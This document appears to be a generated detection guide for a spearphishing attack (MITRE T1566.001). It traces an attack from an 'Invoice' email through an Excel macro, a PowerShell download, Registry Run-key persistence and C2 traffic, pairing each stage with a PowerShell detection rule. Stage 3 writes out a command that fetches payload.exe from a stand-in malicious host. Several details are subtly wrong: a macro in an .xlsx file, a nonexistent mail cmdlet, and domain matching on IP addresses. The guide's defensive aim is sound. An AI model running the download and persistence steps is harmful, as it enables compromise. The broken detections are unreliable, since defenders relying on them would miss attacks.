<output>
Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that, when opened, executes a payload leading to further exploitation. The attack involves multiple applications, including Outlook for email access, Excel for executing the malicious attachment, and a web browser for additional payload delivery.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Application Involved**: Microsoft Outlook
- **User Action**: The user receives an email with a subject line "Invoice Attached" and an Excel file named "Invoice_2023.xlsx".
- **Key Artifacts**: 
  - Email Subject: "Invoice Attached"
  - Attachment: `Invoice_2023.xlsx`
- **Detection Rule**: Monitor for emails with suspicious attachments or subject lines that match known phishing patterns.

```shell
# Monitor for emails with attachments that match specific patterns
Get-Mailbox -ResultSize Unlimited | Get-MailboxFolderStatistics | Where-Object { $_.FolderType -eq "Inbox" } | Get-MailItem | Where-Object { $_.Subject -like "*Invoice Attached*" -and $_.Attachments -ne $null }
```

**Stage 2: Execution of Malicious Payload**
- **Application Involved**: Microsoft Excel
- **User Action**: The user opens the attachment, which prompts them to enable macros.
- **Key Artifacts**: 
  - Excel File: `Invoice_2023.xlsx`
  - Macro Code: `Auto_Open()`
- **Detection Rule**: Monitor for the execution of macros in Excel files, especially those originating from external sources.

```shell
# Monitor for macro execution in Excel files
Get-WinEvent -LogName "Microsoft-Windows-Application-Experience/Operational" | Where-Object { $_.Message -like "*Excel*" -and $_.Message -like "*macro*" }
```

**Stage 3: Payload Execution and Initial Compromise**
- **Application Involved**: PowerShell (spawned by Excel)
- **User Action**: The macro executes a PowerShell command to download a secondary payload from a remote server.
- **Key Artifacts**: 
  - PowerShell Command: `Invoke-WebRequest -Uri "http://malicious.com/payload.exe" -OutFile "$env:TEMP\payload.exe"`
  - Downloaded File: `payload.exe`
- **Detection Rule**: Monitor for PowerShell commands that download executables from suspicious URLs.

```shell
# Monitor for PowerShell commands that download files
Get-WinEvent -LogName "Windows PowerShell" | Where-Object { $_.Message -like "*Invoke-WebRequest*" -and $_.Message -like "*malicious.com*" }
```

**Stage 4: Execution of the Downloaded Payload**
- **Application Involved**: Windows Command Prompt (cmd.exe)
- **User Action**: The PowerShell script executes the downloaded payload.
- **Key Artifacts**: 
  - Executable: `payload.exe`
- **Detection Rule**: Monitor for execution of newly created executables in the TEMP directory.

```shell
# Monitor for execution of files in the TEMP directory
Get-WinEvent -LogName "Security" | Where-Object { $_.EventID -eq 4688 -and $_.NewProcessName -like "*$env:TEMP\payload.exe*" }
```

**Stage 5: Establishing Persistence**
- **Application Involved**: Registry Editor
- **User Action**: The payload modifies the Registry to ensure it runs at startup.
- **Key Artifacts**: 
  - Registry Key: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
  - Value: `"MaliciousPayload"="C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"`
- **Detection Rule**: Monitor for modifications to the Registry Run keys.

```shell
# Monitor for modifications to the Registry Run keys
Get-WinEvent -LogName "Microsoft-Windows-Security-Auditing" | Where-Object { $_.EventID -eq 4657 -and $_.ObjectType -like "*Run*" }
```

**Stage 6: Command and Control Communication**
- **Application Involved**: Web Browser (e.g., Chrome)
- **User Action**: The payload initiates a connection to a command and control server.
- **Key Artifacts**: 
  - C2 URL: `http://malicious.com/c2`
- **Detection Rule**: Monitor for unusual outbound connections to known malicious domains.

```shell
# Monitor for outbound connections to known malicious domains
Get-NetTCPConnection | Where-Object { $_.RemoteAddress -like "*malicious.com*" }
```

</output>